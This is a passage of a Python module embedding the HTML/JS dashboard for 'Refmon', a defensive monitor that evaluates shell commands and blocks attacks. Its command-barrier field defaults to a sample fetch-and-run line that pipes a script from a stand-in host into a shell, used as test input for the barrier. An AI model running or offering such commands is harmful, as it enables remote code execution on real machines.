# ruff: noqa: E501
"""Clean, modern reference monitor interface for the Refmon live barrier daemon.

Self-contained HTML/CSS/JS with zero external network assets so it runs completely offline
on shared cluster nodes and strictly displays privacy-safe post-Observe telemetry (`hmac:...` only).
Includes synthesized Web Audio alert chimes and real-time visual threat notification cards.
"""

from __future__ import annotations

DASHBOARD_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Refmon | Behavioral Reference Monitor &amp; Event Tracer</title>
<style>
:root {
  --bg: #f6f8fa;
  --surface: #ffffff;
  --border: #d8dee4;
  --border-soft: #eaeef2;
  --text: #1f2328;
  --muted: #59636e;
  --allow-bg: #dafbe1;
  --allow-fg: #1a7f37;
  --allow-border: #4ac26b;
  --hold-bg: #fff8c5;
  --hold-fg: #9a6700;
  --hold-border: #d4a72c;
  --block-bg: #ffebe9;
  --block-fg: #cf222e;
  --block-border: #ff8182;
  --neutral-bg: #eef1f4;
  --neutral-fg: #424a53;
  --primary: #0969da;
  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
}
* { box-sizing: border-box; }
body {
  margin: 0;
  background: var(--bg);
  color: var(--text);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  font-size: 13px;
  line-height: 1.45;
}
.container {
  max-width: 1460px;
  margin: 0 auto;
  padding: 16px 20px 40px;
}
header {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 12px 18px;
  margin-bottom: 14px;
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  align-items: center;
  gap: 12px;
}
.header-brand {
  display: flex;
  align-items: center;
  gap: 10px;
}
.pulse-indicator {
  display: inline-block;
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #2da44e;
  box-shadow: 0 0 0 0 rgba(45, 164, 78, 0.7);
  animation: pulse-green 2s infinite;
}
@keyframes pulse-green {
  0% { box-shadow: 0 0 0 0 rgba(45, 164, 78, 0.7); }
  70% { box-shadow: 0 0 0 8px rgba(45, 164, 78, 0); }
  100% { box-shadow: 0 0 0 0 rgba(45, 164, 78, 0); }
}
h1 { margin: 0; font-size: 17px; font-weight: 700; color: var(--text); }
.subtitle { color: var(--muted); font-size: 12px; font-family: var(--mono); margin-top: 2px; }
.summary-strip {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  align-items: center;
}
.metric {
  border: 1px solid var(--border);
  background: #fafbfc;
  border-radius: 6px;
  padding: 5px 10px;
  min-width: 90px;
}
.metric .k { font-size: 10.5px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.3px; }
.metric .v { font-size: 14px; font-weight: 700; font-family: var(--mono); }
.header-actions {
  display: flex;
  gap: 6px;
  align-items: center;
}

/* Attack Alert Notification Banner */
.alert-card {
  border: 1.5px solid var(--block-border);
  background: #fff8f8;
  border-radius: 8px;
  padding: 14px 18px;
  margin-bottom: 14px;
  box-shadow: 0 3px 10px rgba(207, 34, 46, 0.08);
  display: none;
  animation: slide-down 0.25s ease-out;
}
@keyframes slide-down {
  from { opacity: 0; transform: translateY(-8px); }
  to { opacity: 1; transform: translateY(0); }
}
.alert-card-inner {
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  align-items: flex-start;
  gap: 12px;
}
.alert-badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  background: var(--block-bg);
  color: var(--block-fg);
  border: 1px solid var(--block-border);
  border-radius: 20px;
  padding: 2px 10px;
  font-size: 11.5px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.4px;
}
.alert-title {
  font-size: 15px;
  font-weight: 700;
  color: var(--block-fg);
  margin: 6px 0 4px 0;
}
.alert-desc {
  font-size: 13px;
  color: var(--text);
  margin-bottom: 10px;
  line-height: 1.4;
}
.alert-q-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 8px;
  margin: 10px 0;
}
.alert-q-item {
  border: 1px solid var(--border);
  background: #ffffff;
  border-radius: 6px;
  padding: 8px 10px;
}
.alert-q-item .q-name {
  font-size: 11px;
  font-weight: 600;
  color: var(--muted);
  text-transform: uppercase;
}
.alert-q-item .q-status {
  font-size: 12.5px;
  font-weight: 700;
  margin-top: 2px;
}
.alert-meta {
  font-size: 11.5px;
  font-family: var(--mono);
  color: var(--muted);
  display: flex;
  flex-wrap: wrap;
  gap: 14px;
  margin-top: 8px;
}

.top-grid {
  display: grid;
  grid-template-columns: 1.35fr 1fr 1fr;
  gap: 14px;
  margin-bottom: 14px;
}
@media (max-width: 1150px) {
  .top-grid { grid-template-columns: 1fr; }
}
.panel {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 14px 16px;
  margin-bottom: 14px;
}
.panel h2 {
  margin: 0 0 10px 0;
  font-size: 13.5px;
  font-weight: 700;
  color: var(--text);
  border-bottom: 1px solid var(--border-soft);
  padding-bottom: 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.muted { color: var(--muted); font-size: 12px; }
.mono { font-family: var(--mono); font-size: 12px; }

label {
  display: block;
  font-size: 11.5px;
  font-weight: 600;
  color: var(--muted);
  margin: 8px 0 3px;
}
input, select, textarea {
  width: 100%;
  background: #ffffff;
  color: var(--text);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 6px 8px;
  font-family: var(--mono);
  font-size: 12px;
}
textarea { min-height: 52px; resize: vertical; }

button {
  cursor: pointer;
  background: #f6f8fa;
  color: var(--text);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 6px 10px;
  font-size: 12px;
  font-weight: 500;
  transition: all 0.15s ease-in-out;
}
button:hover { background: #eaeef2; }
button.primary {
  background: var(--primary);
  color: #ffffff;
  border-color: var(--primary);
}
button.primary:hover { background: #0858b9; }
button.danger {
  background: var(--block-bg);
  color: var(--block-fg);
  border-color: var(--block-border);
}
button.danger:hover { background: #ffdcd8; }
button.active-mode {
  background: #1f2328;
  color: #ffffff;
  border-color: #1f2328;
}

.group-title {
  font-size: 11px;
  font-weight: 700;
  color: var(--muted);
  margin: 8px 0 4px;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
.btn-wrap {
  display: flex;
  flex-wrap: wrap;
  gap: 5px;
}
.btn-sm { padding: 4px 8px; font-size: 11.5px; }

.notice {
  margin-top: 8px;
  padding: 8px 10px;
  border-radius: 6px;
  border: 1px solid var(--border);
  background: #f6f8fa;
  font-size: 12px;
}

.tag {
  display: inline-block;
  padding: 1px 7px;
  border-radius: 12px;
  font-size: 11px;
  font-weight: 700;
  font-family: var(--mono);
}
.tag.allow, .tag.pass { background: var(--allow-bg); color: var(--allow-fg); border: 1px solid var(--allow-border); }
.tag.hold { background: var(--hold-bg); color: var(--hold-fg); border: 1px solid var(--hold-border); }
.tag.block, .tag.fail { background: var(--block-bg); color: var(--block-fg); border: 1px solid var(--block-border); }
.tag.neutral { background: var(--neutral-bg); color: var(--neutral-fg); border: 1px solid var(--border); }

.q-line { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 4px; }
.q-chip {
  font-size: 11px;
  font-family: var(--mono);
  padding: 1px 6px;
  border-radius: 4px;
  border: 1px solid var(--border);
}
.q-chip.qfail { background: var(--block-bg); color: var(--block-fg); border-color: #ffcecb; font-weight: 700; }
.q-chip.qok { background: #f6f8fa; color: var(--muted); }

table {
  width: 100%;
  border-collapse: collapse;
  font-size: 12px;
}
th {
  text-align: left;
  font-weight: 600;
  color: var(--muted);
  background: #f6f8fa;
  border-bottom: 1px solid var(--border);
  padding: 8px 10px;
  font-size: 11.5px;
}
td {
  vertical-align: top;
  border-bottom: 1px solid var(--border-soft);
  padding: 8px 10px;
}
tr:hover td { background: #fafbfc; }

.kv-row {
  display: flex;
  justify-content: space-between;
  padding: 3px 0;
  border-bottom: 1px solid var(--border-soft);
  font-size: 12px;
}
.log-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 14px;
}
@media (max-width: 980px) {
  .log-grid { grid-template-columns: 1fr; }
}
pre.logbox {
  margin: 0;
  background: #f6f8fa;
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 10px;
  font-family: var(--mono);
  font-size: 11.5px;
  max-height: 220px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-all;
}
details summary {
  cursor: pointer;
  font-weight: 600;
  font-size: 13px;
  padding: 4px 0;
}
</style>
</head>
<body>
<div class="container">
  <header>
    <div class="header-brand">
      <span class="pulse-indicator" title="Live Behavioral Reference Monitor Active"></span>
      <div>
        <h1>Refmon Live Security Barrier &amp; Reference Monitor</h1>
        <div class="subtitle" id="hdr-paths">Real-Time Behavioral Event Tracer &amp; Incident Guard</div>
      </div>
    </div>
    <div class="summary-strip">
      <div class="metric"><div class="k">Signed Policy</div><div class="v" id="m-sig">...</div></div>
      <div class="metric"><div class="k">Active Mode</div><div class="v" id="m-mode">BLOCK</div></div>
      <div class="metric"><div class="k">Events Traced</div><div class="v" id="m-events">0</div></div>
      <div class="metric"><div class="k">Attacks Blocked</div><div class="v" id="m-blocked" style="color:var(--block-fg)">0</div></div>
      <div class="metric"><div class="k">Holds (Review)</div><div class="v" id="m-holds" style="color:var(--hold-fg)">0</div></div>
      <div class="metric"><div class="k">Quarantined</div><div class="v" id="m-quar">0</div></div>
      <div class="metric"><div class="k">Rootkit Scan</div><div class="v" id="m-rk">ALLOW</div></div>
      <div class="metric"><div class="k">Suite Checks</div><div class="v" id="m-eval">0 / 0</div></div>
    </div>
    <div class="header-actions">
      <button id="btn-sound" class="btn-sm" onclick="toggleSound()" title="Toggle Web Audio alarm chimes for blocked attacks">🔔 Sound: ON</button>
      <button id="btn-desktop-notif" class="btn-sm" onclick="requestDesktopNotif()" title="Enable desktop notifications in browser">💻 Desktop Alerts</button>
    </div>
  </header>

  <div id="token-banner" class="notice" style="display:none; background:#fff8c5; border:1px solid #d4a72c; color:#734f00; margin-bottom:14px; padding:10px 14px; border-radius:6px;">
    <strong>API Token Required:</strong> The live barrier daemon requires authentication on shared cluster nodes.
    <div style="margin-top:6px; display:flex; flex-wrap:wrap; gap:8px; align-items:center;">
      <input id="token-input" placeholder="Paste API token from terminal or /tmp/refmon-live-*/api.token" style="flex:1; min-width:280px; font-family:var(--mono); padding:6px 9px; font-size:12px; border:1px solid #d4a72c; border-radius:4px;">
      <button class="btn-sm" onclick="saveToken()" style="background:#0969da; color:#fff; border:none; padding:6px 14px; cursor:pointer; border-radius:4px; font-weight:600;">Save &amp; Authenticate</button>
    </div>
  </div>

  <!-- Section 1: Live Threat Notification Banner (Top-Priority Alert) -->
  <div id="attack-alert-card" class="alert-card">
    <div class="alert-card-inner">
      <div style="flex:1; min-width:290px;">
        <div style="display:flex; align-items:center; gap:8px;">
          <span class="alert-badge" id="alert-verdict-badge">🚨 ATTACK BLOCKED</span>
          <span class="muted mono" id="alert-time">00:00:00 UTC</span>
        </div>
        <div class="alert-title" id="alert-title">ClickFix Paste RCE</div>
        <div class="alert-desc" id="alert-desc">An untrusted command copied from a web browser attempted to connect to an unapproved external server. Refmon halted execution and isolated the process tree.</div>
        
        <div class="alert-q-grid">
          <div class="alert-q-item">
            <div class="q-name">1. Provenance Origin</div>
            <div class="q-status" id="alert-q-origin" style="color:var(--block-fg)">FAIL (Untrusted external source)</div>
          </div>
          <div class="alert-q-item">
            <div class="q-name">2. Role Contract</div>
            <div class="q-status" id="alert-q-contract" style="color:var(--block-fg)">FAIL (Command violates process contract)</div>
          </div>
          <div class="alert-q-item">
            <div class="q-name">3. Behavioral Effect</div>
            <div class="q-status" id="alert-q-effect" style="color:var(--block-fg)">FAIL (Dangerous action: network fetch)</div>
          </div>
        </div>

        <div class="alert-meta">
          <span>Containment: <strong id="alert-action">Process tree killed, network cut</strong></span>
          <span>Evidence Score: <strong id="alert-odds">-2.61 nats</strong></span>
          <span>Story ID: <strong id="alert-story">st-live-01</strong></span>
        </div>
      </div>
      <div>
        <button class="btn-sm" onclick="dismissAlert()" style="background:#fff; border-color:var(--border);">Dismiss Notification ✕</button>
      </div>
    </div>
  </div>

  <!-- Section 2: Wireshark-Style Live Reference Monitor Ledger -->
  <div class="panel">
    <h2>
      <span>Live Event Ledger (Wireshark-Style Reference Monitor Stream)</span>
      <div class="btn-wrap">
        <button class="btn-sm" onclick="setFilter('all')" id="flt-all">All Events</button>
        <button class="btn-sm" onclick="setFilter('attack')" id="flt-attack">🔴 Blocked Attacks</button>
        <button class="btn-sm" onclick="setFilter('hold')" id="flt-hold">🟡 Holds</button>
        <button class="btn-sm" onclick="setFilter('benign')" id="flt-benign">🟢 Benign</button>
      </div>
    </h2>
    <div style="overflow-x:auto;">
      <table>
        <thead>
          <tr>
            <th style="width:115px;">Time &amp; Story</th>
            <th style="width:205px;">Attack / Input Stream</th>
            <th style="width:180px;">Verdict &amp; Barrier Status</th>
            <th style="width:215px;">3-Question Judgment</th>
            <th style="width:210px;">Evidence Math (nats)</th>
            <th>Behavior Explanation &amp; Safe Telemetry</th>
          </tr>
        </thead>
        <tbody id="stories-tbody">
          <tr><td colspan="6" class="muted">No events traced yet. Launch an attack preset below or submit a test command to watch live monitor decisions.</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="top-grid">
    <!-- Panel 1: Attack & Control Suite -->
    <div class="panel">
      <h2>
        <span>Attack Lab &amp; Test Presets</span>
        <button class="primary btn-sm" onclick="runFullSuite()">Run All 16 Scenarios</button>
      </h2>
      <div id="preset-groups">Loading scenarios...</div>
      <div style="margin-top:10px; padding-top:8px; border-top:1px solid var(--border-soft); display:flex; gap:6px; align-items:center;">
        <span class="muted" style="white-space:nowrap;">Golden Replay (S01-S50):</span>
        <input id="golden-id" value="S01" style="max-width:90px;">
        <button class="btn-sm" onclick="runGolden()">Replay</button>
      </div>
      <div id="suite-banner" class="notice" style="display:none;"></div>
    </div>

    <!-- Panel 2: Custom Command Barrier -->
    <div class="panel">
      <h2>Custom Command Barrier (Interactive Guard)</h2>
      <div class="muted">Inspect any shell command through Refmon before allowing it to execute.</div>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
        <div>
          <label>Origin Source</label>
          <select id="cmd-origin">
            <option value="web">web (Browser paste / lure)</option>
            <option value="mail">mail (Email copy)</option>
            <option value="agent_input">agent_input (AI prompt)</option>
            <option value="inbound_request">inbound_request (HTTP)</option>
            <option value="download">download (File)</option>
            <option value="none">none (Typed locally by human)</option>
          </select>
        </div>
        <div>
          <label>Process Role</label>
          <select id="cmd-role">
            <option value="interactive_shell">interactive_shell</option>
            <option value="web_worker">web_worker</option>
            <option value="agent">agent</option>
            <option value="package_installer">package_installer</option>
          </select>
        </div>
      </div>
      <label>Command Line</label>
      <textarea id="cmd-text">curl -s http://bad.example.invalid/fix.sh | sh</textarea>
      <div style="margin-top:8px;">
        <button class="primary" onclick="submitCommand()" style="width:100%;">Evaluate Command Through Barrier</button>
      </div>
      <div id="cmd-banner" class="notice" style="display:none;"></div>
    </div>

    <!-- Panel 3: Signed Policy, Holds, Quarantine & Rootkit -->
    <div class="panel">
      <h2>Signed Policy, Holds &amp; Host Integrity</h2>
      <div style="display:flex; gap:6px; margin-bottom:8px;">
        <button id="btn-mode-block" onclick="setMode('block')" style="flex:1;">Mode: Block</button>
        <button id="btn-mode-warn" onclick="setMode('warn')" style="flex:1;">Mode: Warn</button>
        <button id="btn-mode-observe" onclick="setMode('observe')" style="flex:1;">Mode: Observe</button>
      </div>
      <div id="policy-kv"></div>

      <div style="margin-top:10px;">
        <div style="display:flex; justify-content:space-between; align-items:center;">
          <strong style="font-size:12px;">Rootkit Scanner (6 Read-Only Engines)</strong>
          <button class="btn-sm" onclick="scanRootkit()">Scan Now</button>
        </div>
        <div id="rk-summary" class="muted mono" style="margin-top:3px;"></div>
      </div>

      <div style="margin-top:10px;">
        <strong style="font-size:12px;">Health: Heartbeat &amp; Watchdog</strong>
        <div id="health-box" class="muted mono" style="margin-top:3px;">Not started by serve.</div>
      </div>

      <div style="margin-top:10px;">
        <strong style="font-size:12px;">Pending Holds (Human Review)</strong>
        <div id="holds-list" class="muted" style="margin-top:3px;">None</div>
      </div>

      <div style="margin-top:8px;">
        <strong style="font-size:12px;">Quarantined Files (Mode 0400)</strong>
        <div id="quar-list" class="muted mono" style="margin-top:3px;">Empty</div>
      </div>
    </div>
  </div>

  <!-- Live Logs & Contracts -->
  <div class="log-grid">
    <div class="panel">
      <h2>Live Audit Log (barrier.log)</h2>
      <pre class="logbox" id="barrier-log">Waiting...</pre>
    </div>
    <div class="panel">
      <h2>Post-Observe Event Ledger (events.jsonl — HMAC Digests Only)</h2>
      <pre class="logbox" id="events-log">No observed events yet.</pre>
    </div>
  </div>

  <div class="panel" style="margin-top:14px;">
    <details>
      <summary>View Active Signed Role Contracts &amp; Protected Assets</summary>
      <div id="contracts-box" class="mono muted" style="margin-top:8px;"></div>
    </details>
  </div>
</div>

<script>
let currentFilter = 'all';
let presetsRendered = false;
let soundEnabled = true;
let audioCtx = null;
const seenStoryIds = new Set();
let isInitialLoad = true;

// Sound preference from localStorage
try {
  const saved = localStorage.getItem('refmonSound');
  if (saved !== null) soundEnabled = (saved === '1');
} catch (e) {}

function getAudioContext() {
  if (!audioCtx) {
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (AudioContextClass) audioCtx = new AudioContextClass();
  }
  return audioCtx;
}

function unlockAudio() {
  const ctx = getAudioContext();
  if (ctx && ctx.state === 'suspended') {
    ctx.resume().catch(() => {});
  }
}
document.addEventListener('click', unlockAudio, {once: false});

function playAlertSound(kind) {
  if (!soundEnabled) return;
  try {
    const ctx = getAudioContext();
    if (!ctx) return;
    if (ctx.state === 'suspended') ctx.resume().catch(() => {});
    const now = ctx.currentTime;
    const osc1 = ctx.createOscillator();
    const osc2 = ctx.createOscillator();
    const gain = ctx.createGain();

    if (kind === 'block') {
      // Crisp 2-tone alarm chime for blocked attack (880 Hz -> 440 Hz)
      osc1.type = 'sawtooth';
      osc1.frequency.setValueAtTime(880, now);
      osc1.frequency.exponentialRampToValueAtTime(440, now + 0.28);

      osc2.type = 'sine';
      osc2.frequency.setValueAtTime(440, now);
      osc2.frequency.exponentialRampToValueAtTime(220, now + 0.28);

      gain.gain.setValueAtTime(0.18, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);

      osc1.connect(gain);
      osc2.connect(gain);
      gain.connect(ctx.destination);

      osc1.start(now);
      osc2.start(now);
      osc1.stop(now + 0.35);
      osc2.stop(now + 0.35);
    } else {
      // Warning chime for hold (587 Hz -> 880 Hz)
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(587.33, now);
      osc1.frequency.exponentialRampToValueAtTime(880, now + 0.22);

      gain.gain.setValueAtTime(0.14, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);

      osc1.connect(gain);
      gain.connect(ctx.destination);

      osc1.start(now);
      osc1.stop(now + 0.3);
    }
  } catch (err) {
    console.warn('Audio playback not permitted yet:', err);
  }
}

function toggleSound() {
  soundEnabled = !soundEnabled;
  try { localStorage.setItem('refmonSound', soundEnabled ? '1' : '0'); } catch (e) {}
  updateSoundButton();
  if (soundEnabled) {
    unlockAudio();
    playAlertSound('hold');
  }
}

function updateSoundButton() {
  const btn = document.getElementById('btn-sound');
  if (btn) {
    btn.innerHTML = soundEnabled ? '🔔 Sound: ON' : '🔕 Sound: MUTED';
    btn.style.color = soundEnabled ? 'var(--allow-fg)' : 'var(--muted)';
  }
}

function requestDesktopNotif() {
  if (!('Notification' in window)) {
    alert('Desktop notifications are not supported in this browser.');
    return;
  }
  Notification.requestPermission().then(() => {
    updateNotifButton();
  });
}

function updateNotifButton() {
  const btn = document.getElementById('btn-desktop-notif');
  if (!btn) return;
  if (!('Notification' in window)) {
    btn.style.display = 'none';
    return;
  }
  if (Notification.permission === 'granted') {
    btn.innerHTML = '💻 Desktop Alerts: ON';
    btn.style.color = 'var(--allow-fg)';
  } else {
    btn.innerHTML = '💻 Desktop Alerts';
    btn.style.color = 'var(--muted)';
  }
}

function triggerDesktopNotif(title, body) {
  if ('Notification' in window && Notification.permission === 'granted') {
    try {
      new Notification(title, { body: body, icon: '/favicon.ico' });
    } catch (e) {}
  }
}

function showThreatAlert(story) {
  const box = document.getElementById('attack-alert-card');
  if (!box) return;

  const isBlock = story.decision === 'block';
  const badge = document.getElementById('alert-verdict-badge');
  badge.textContent = isBlock ? '🚨 ATTACK BLOCKED' : '⚠️ INCIDENT HELD';
  badge.className = 'alert-badge';
  badge.style.background = isBlock ? 'var(--block-bg)' : 'var(--hold-bg)';
  badge.style.color = isBlock ? 'var(--block-fg)' : 'var(--hold-fg)';
  badge.style.borderColor = isBlock ? 'var(--block-border)' : 'var(--hold-border)';

  box.style.borderColor = isBlock ? 'var(--block-border)' : 'var(--hold-border)';
  box.style.background = isBlock ? '#fff8f8' : '#fffdf0';

  document.getElementById('alert-time').textContent = (story.ts || 'Just now') + ' UTC';
  document.getElementById('alert-title').textContent = story.attack_type || 'Unknown Behavior Incident';
  document.getElementById('alert-desc').textContent = story.explanation || 'Refmon judged the process behavior outside its role contract.';

  const q = story.failed || {};
  const elO = document.getElementById('alert-q-origin');
  elO.textContent = q.origin ? 'FAIL (Untrusted external input)' : 'PASS (Trusted / Local source)';
  elO.style.color = q.origin ? 'var(--block-fg)' : 'var(--allow-fg)';

  const elC = document.getElementById('alert-q-contract');
  elC.textContent = q.contract ? 'FAIL (Process broke role contract)' : 'PASS (Within assigned role)';
  elC.style.color = q.contract ? 'var(--block-fg)' : 'var(--allow-fg)';

  const elE = document.getElementById('alert-q-effect');
  elE.textContent = q.effect ? 'FAIL (Dangerous effect observed)' : 'PASS (No dangerous effect)';
  elE.style.color = q.effect ? 'var(--block-fg)' : 'var(--allow-fg)';

  document.getElementById('alert-action').textContent = story.enforcement || (story.actions_taken && story.actions_taken.length ? story.actions_taken.join(', ') : 'Blocked by barrier');
  document.getElementById('alert-odds').textContent = `${story.log_odds ?? '—'} nats`;
  document.getElementById('alert-story').textContent = story.story_id || '—';

  box.style.display = 'block';
}

function dismissAlert() {
  const box = document.getElementById('attack-alert-card');
  if (box) box.style.display = 'none';
}

function getToken() {
  const fromHash = new URLSearchParams(location.hash.slice(1)).get('token');
  if (fromHash) {
    try { sessionStorage.setItem('refmonToken', fromHash); } catch (e) {}
    try { history.replaceState(null, '', location.pathname); } catch (e) {}
    return fromHash;
  }
  try {
    const s = sessionStorage.getItem('refmonToken');
    if (s) return s;
  } catch (e) {}
  const inp = document.getElementById('token-input');
  if (inp && inp.value.trim()) return inp.value.trim();
  return '';
}

function saveToken() {
  const inp = document.getElementById('token-input');
  const val = (inp ? inp.value : '').trim();
  if (val) {
    try { sessionStorage.setItem('refmonToken', val); } catch (e) {}
    const tb = document.getElementById('token-banner');
    if (tb) tb.style.display = 'none';
    refresh();
  }
}

async function api(path, body) {
  const token = getToken();
  const headers = {'X-Refmon-Token': token};
  const opts = body !== undefined
    ? {method: 'POST', headers: {...headers, 'Content-Type': 'application/json'}, body: JSON.stringify(body)}
    : {method: 'GET', headers};
  const r = await fetch(path, opts);
  if (r.status === 401) {
    const tb = document.getElementById('token-banner');
    if (tb) tb.style.display = 'block';
    throw new Error('API token missing or invalid: paste token in banner above or open URL printed by refmon serve');
  }
  return await r.json();
}

function esc(val) {
  return String(val ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function setFilter(f) {
  currentFilter = f;
  refresh();
}

function renderPresets(presets) {
  if (presetsRendered || !presets || !presets.length) return;
  presetsRendered = true;
  const groups = {};
  for (const p of presets) {
    if (!groups[p.group]) groups[p.group] = [];
    groups[p.group].push(p);
  }
  const box = document.getElementById('preset-groups');
  box.innerHTML = Object.entries(groups).map(([gName, items]) => `
    <div class="group-title">${esc(gName)}</div>
    <div class="btn-wrap">
      ${items.map(it => `<button class="btn-sm" onclick="runPreset('${esc(it.id)}')">${esc(it.label)}</button>`).join('')}
    </div>
  `).join('');
}

async function runPreset(name) {
  const b = document.getElementById('suite-banner');
  b.style.display = 'block';
  b.className = 'notice';
  b.style.background = '';
  b.style.color = '';
  b.textContent = `Running scenario: ${name}...`;
  try {
    const res = await api('/api/preset', {name});
    if (res.error) {
      b.style.background = 'var(--block-bg)';
      b.style.color = 'var(--block-fg)';
      b.innerHTML = `<strong>Error in ${esc(name)}:</strong> ${esc(res.error)}`;
    } else {
      const match = res.expected ? (res.decision === res.expected ? 'PASS' : 'MISMATCH') : '';
      b.style.background = match === 'PASS' ? 'var(--allow-bg)' : (match === 'MISMATCH' ? 'var(--block-bg)' : '');
      b.style.color = match === 'PASS' ? 'var(--allow-fg)' : (match === 'MISMATCH' ? 'var(--block-fg)' : '');
      b.innerHTML = `<strong>${esc(res.attack_type || name)}</strong> &rarr; Verdict: <strong>${esc(res.decision).toUpperCase()}</strong> `
        + (match ? `(Expected ${esc(res.expected).toUpperCase()}: <strong>${match}</strong>) ` : '')
        + `| L = ${esc(res.log_odds)} nats. ${esc(res.note || '')}`;

      if (res.decision === 'block' || res.decision === 'hold') {
        playAlertSound(res.decision);
        showThreatAlert({
          decision: res.decision,
          attack_type: res.attack_type || name,
          explanation: res.note || `Scenario ${name} triggered a ${res.decision.toUpperCase()} decision.`,
          log_odds: res.log_odds,
          ts: new Date().toISOString().slice(11, 19),
          story_id: res.story_id || 'preset',
          failed: { origin: true, contract: true, effect: true },
          enforcement: 'Simulated enforcer action recorded'
        });
      }
    }
  } catch (err) {
    b.style.background = 'var(--block-bg)';
    b.style.color = 'var(--block-fg)';
    b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
  }
  await refresh();
}

async function runFullSuite() {
  const b = document.getElementById('suite-banner');
  b.style.display = 'block';
  b.className = 'notice';
  b.style.background = '';
  b.style.color = '';
  b.textContent = 'Running all 16 attack & benign scenarios...';
  try {
    const res = await api('/api/run_suite', {});
    if (res.error) {
      b.style.background = 'var(--block-bg)';
      b.style.color = 'var(--block-fg)';
      b.innerHTML = `<strong>Suite Error:</strong> ${esc(res.error)}`;
    } else {
      b.style.background = res.failed === 0 ? 'var(--allow-bg)' : 'var(--hold-bg)';
      b.style.color = res.failed === 0 ? 'var(--allow-fg)' : 'var(--hold-fg)';
      b.innerHTML = `<strong>Suite Complete:</strong> ${res.passed} / ${res.total} scenarios matched expected policy verdicts `
        + `(${res.failed} mismatches). Inspect every row in the ledger below.`;
      if (res.failed === 0) playAlertSound('hold');
    }
  } catch (err) {
    b.style.background = 'var(--block-bg)';
    b.style.color = 'var(--block-fg)';
    b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
  }
  await refresh();
}

async function runGolden() {
  const scenario = document.getElementById('golden-id').value.trim();
  const b = document.getElementById('suite-banner');
  b.style.display = 'block';
  b.className = 'notice';
  b.style.background = '';
  b.style.color = '';
  b.textContent = `Replaying golden scenario ${scenario}...`;
  try {
    const res = await api('/api/golden', {scenario});
    if (res.error) {
      b.style.background = 'var(--block-bg)';
      b.style.color = 'var(--block-fg)';
      b.textContent = res.error;
    } else {
      b.style.background = res.passed ? 'var(--allow-bg)' : 'var(--block-bg)';
      b.style.color = res.passed ? 'var(--allow-fg)' : 'var(--block-fg)';
      b.innerHTML = `<strong>${esc(res.scenario)}</strong> &rarr; ${esc(res.decision).toUpperCase()} `
        + `(expected ${esc(res.expected).toUpperCase()}, check=${res.passed ? 'PASS' : 'MISMATCH'}, L=${res.log_odds} nats)`;
    }
  } catch (err) {
    b.style.background = 'var(--block-bg)';
    b.style.color = 'var(--block-fg)';
    b.textContent = err.message || String(err);
  }
  await refresh();
}

async function submitCommand() {
  const origin = document.getElementById('cmd-origin').value;
  const role = document.getElementById('cmd-role').value;
  const command = document.getElementById('cmd-text').value;
  const b = document.getElementById('cmd-banner');
  b.style.display = 'block';
  b.textContent = 'Evaluating command through barrier...';
  try {
    const res = await api('/api/guard', {command, origin, role, execute: true});
    if (res.error) {
      b.innerHTML = `<strong>Error:</strong> ${esc(res.error)}`;
    } else {
      b.innerHTML = `<strong>Verdict: ${esc(res.decision).toUpperCase()}</strong> `
        + `(L = ${esc(res.log_odds)} nats, executed = ${esc(res.executed)})<br>`
        + `${esc(res.explanation || '')}`
        + (res.output ? `<br><span class="mono">stdout: ${esc(res.output)}</span>` : '');

      if (res.decision === 'block' || res.decision === 'hold') {
        playAlertSound(res.decision);
        showThreatAlert({
          decision: res.decision,
          attack_type: `Pasted Command (${origin})`,
          explanation: res.explanation || 'Command rejected by signed role policy barrier.',
          log_odds: res.log_odds,
          ts: new Date().toISOString().slice(11, 19),
          story_id: res.story_id || 'guard',
          failed: { origin: origin !== 'none', contract: true, effect: true },
          enforcement: res.executed ? 'Executed (Warn mode)' : 'Execution Prevented by Barrier'
        });
        triggerDesktopNotif('Refmon: Command Blocked', res.explanation || 'Command violated policy');
      }
    }
  } catch (err) {
    b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
  }
  await refresh();
}

async function resolveHold(hold_id, platform, answer) {
  try {
    await api('/api/hold', {hold_id, platform, answer});
  } catch (e) {
    alert(e.message || String(e));
  }
  await refresh();
}

async function setMode(mode) {
  try {
    await api('/api/mode', {mode});
  } catch (e) {
    alert(e.message || String(e));
  }
  await refresh();
}

async function scanRootkit() {
  try {
    await api('/api/rootkit', {});
  } catch (e) {
    alert(e.message || String(e));
  }
  await refresh();
}

async function refresh() {
  try {
    const st = await api('/api/state');
    const tb = document.getElementById('token-banner');
    if (tb) tb.style.display = 'none';
    renderPresets(st.presets);

    document.getElementById('hdr-paths').textContent =
